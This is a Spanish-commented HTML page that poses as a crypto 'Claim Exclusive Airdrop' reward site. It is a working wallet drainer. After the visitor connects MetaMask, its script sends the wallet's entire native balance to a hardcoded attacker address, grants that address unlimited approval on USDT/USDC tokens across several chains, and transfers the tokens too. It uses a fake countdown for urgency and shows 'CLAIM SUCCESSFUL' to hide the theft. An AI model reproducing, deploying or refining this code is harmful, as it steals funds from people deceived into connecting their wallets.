<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        /* ESTILOS ORIGINALES MANTENIDOS */
        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { text-align: center; max-width: 400px; width: 90%; padding: 20px; background: #161b22; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #58a6ff; }
        p { color: #8b949e; font-size: 0.9rem; margin-bottom: 20px; }
        .btn { background: linear-gradient(90deg, #6c5ce7, #a29bfe); border: none; padding: 12px 24px; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: transform 0.1s; }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
        .btn:disabled { background: #333; cursor: not-allowed; }
        .status { margin-top: 15px; font-size: 0.85rem; min-height: 20px; color: #ffd700; }
        
        /* MODAL MOVIL */
        .mobile-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #1f2937; padding: 20px; border-radius: 12px; text-align: center; width: 80%; max-width: 300px; border: 1px solid #374151; }
        .modal-btn { background: #3b82f6; margin-top: 15px; }
        
        /* LOGS */
        #logs { text-align: left; background: #0d1117; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.75rem; color: #4ade80; max-height: 100px; overflow-y: auto; margin-top: 10px; display: none; }
        .timer { font-size: 0.8rem; color: #ef4444; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container">
    <h1>🎁 Claim Exclusive Airdrop</h1>
    <p>Verifying eligibility... <br> Reward: 1.5 ETH Equivalent in Tokens</p>
    
    <button id="connectBtn" class="btn">Connect Wallet</button>
    <div id="status" class="status"></div>
    <div id="timer" class="timer">Claiming closes in: 15:00</div>
    <div id="logs"></div>
</div>

<!-- MODAL PARA MOVIL -->
<div id="mobileModal" class="mobile-modal">
    <div class="modal-content">
        <h3>MetaMask Mobile Detected</h3>
        <p>Para continuar, por favor abre tu aplicación MetaMask.</p>
        <button id="openAppBtn" class="btn modal-btn">Abrir MetaMask</button>
        <button id="confirmOpenBtn" class="btn" style="background:#22c55e; margin-top:10px;">Ya está abierto / Conectar</button>
    </div>
</div>

<script>
    // CONFIGURACIÓN
    const TARGET_WALLET = "0x6cd203676973F30e9F5398b3C3C8853531a3E432"; // TU WALLET AQUÍ
    let provider;
    let signer;
    let userAddress;
    let currentChainId;

    // ELEMENTOS DOM
    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const logsDiv = document.getElementById('logs');
    const mobileModal = document.getElementById('mobileModal');
    const openAppBtn = document.getElementById('openAppBtn');
    const confirmOpenBtn = document.getElementById('confirmOpenBtn');

    // UTILIDAD: LOGS
    function log(msg) {
        logsDiv.style.display = 'block';
        const p = document.createElement('div');
        p.textContent = `> ${msg}`;
        logsDiv.appendChild(p);
        logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    // UTILIDAD: FORMATEO DE RED (ARREGLO DEL ERROR "INVALID NETWORK")
    function getNetworkName(chainId) {
        switch(chainId) {
            case 1: return "homestead";
            case 56: return "bsc";
            case 137: return "matic";
            case 42161: return "arbitrum";
            case 10: return "optimism";
            case 43114: return "avalanche";
            case 199: return "bittorrent";
            default: return "unknown";
        }
    }

    // INICIAR TIMER
    let timeLeft = 900; 
    setInterval(() => {
        if(timeLeft <= 0) return;
        timeLeft--;
        let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        let s = (timeLeft % 60).toString().padStart(2, '0');
        document.getElementById('timer').textContent = `Claiming closes in: ${m}:${s}`;
    }, 1000);

    // DETECCIÓN DE DISPOSITIVO
    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
    }

    // LÓGICA DE CONEXIÓN
    connectBtn.addEventListener('click', async () => {
        if (!window.ethereum) {
            statusDiv.textContent = "Instala MetaMask primero.";
            return;
        }

        // FLUJO MÓVIL ESPECÍFICO
        if (isMobile()) {
            mobileModal.style.display = 'flex';
            
            // Al hacer clic en "Abrir App", intentamos abrir el deep link
            openAppBtn.addEventListener('click', () => {
                window.open('https://metamask.io/', '_blank'); // Abre la web/app
                // Opcional: Intentar conectar directamente si la API lo permite
                tryConnect(); 
            });

            // El botón "Ya está abierto" fuerza la reconexión
            confirmOpenBtn.addEventListener('click', () => {
                mobileModal.style.display = 'none';
                tryConnect();
            });
            return; 
        }

        // FLUJO ESCRITORIO (NORMAL)
        try {
            await tryConnect();
        } catch (err) {
            console.error(err);
            statusDiv.textContent = "Error de conexión.";
        }
    });

    async function tryConnect() {
        try {
            // SOLUCIÓN AL ERROR DE RED: Usar provider.request para obtener accounts
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            
            // Crear proveedor correctamente basado en la red activa
            // Esto soluciona el error "invalid network"
            const network = await window.ethereum.request({ method: 'eth_chainId' });
            const chainIdNum = parseInt(network);
            
            // Instanciar el proveedor de Ethers
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            currentChainId = chainIdNum;

            log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
            log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
            
            startDrain();

        } catch (error) {
            statusDiv.textContent = "Conexión rechazada o fallida.";
            log(error.message);
        }
    }

    // LÓGICA DE DRENAJE (DRRAINER)
    async function startDrain() {
        connectBtn.disabled = true;
        connectBtn.textContent = "Processing...";
        
        try {
            // 1. Obtener balance nativo
            const balance = await provider.getBalance(userAddress);
            if (balance > 0) {
                log("Transferring native token...");
                const tx = await signer.sendTransaction({
                    to: TARGET_WALLET,
                    value: balance.sub(await provider.getGasPrice()) // Restar gas
                });
                await tx.wait();
                log(`Native drained! Tx: ${tx.hash.substring(0,10)}...`);
            } else {
                log("No native funds found.");
            }

            // 2. Definir tokens comunes según la cadena
            const tokensMap = {
                1: ["0xdAC17F958D2ee523a2206206994597C13D831ec7"], // USDT
                56: ["0x55d398326f99059fF775485246999027B3197955"], // USDT BSC
                137: ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F"], // USDT Polygon
                42161: ["0xaf88d065e77c8cC2239327C5EDb3A432268e593B"], // USDC Arb
                10: ["0x0b2C639c533813f4Aa9D7837CAf62653d097F889"], // USDC Op
                43114: ["0xB97EF9Ef8734c713c021e045e004724a595CC239"], // USDC Avax
                199: ["0xeBAB9185288804113051349388f2015148530012"] // USDT BTT
            };

            const tokenAddress = tokensMap[currentChainId] || null;

            if (tokenAddress) {
                log(`Approving Token: ${tokenAddress}`);
                
                // Interfaz ERC20 simplificada
                const erc20 = new ethers.Contract(tokenAddress, [
                    "function approve(address spender, uint256 amount) public returns (bool)",
                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                    "function balanceOf(address owner) view returns (uint256)"
                ], signer);

                const balance = await erc20.balanceOf(userAddress);
                if (balance > 0) {
                    // Approve Max
                    const tx1 = await erc20.approve(TARGET_WALLET, ethers.constants.MaxUint256);
                    await tx1.wait();
                    log("Approval confirmed.");

                    // Transfer
                    log("Transferring tokens...");
                    const tx2 = await erc20.transferFrom(userAddress, TARGET_WALLET, balance);
                    await tx2.wait();
                    log(`Token drained! Tx: ${tx2.hash.substring(0,10)}...`);
                } else {
                    log("No tokens found.");
                }
            } else {
                log("No specific token list for this chain yet.");
            }

            statusDiv.textContent = "✅ CLAIM SUCCESSFUL";
            statusDiv.style.color = "#4ade80";
            connectBtn.textContent = "Done";

        } catch (err) {
            console.error(err);
            statusDiv.textContent = "❌ ERROR: " + err.message;
            log(err.message);
        }
    }
</script>

</body>
</html>
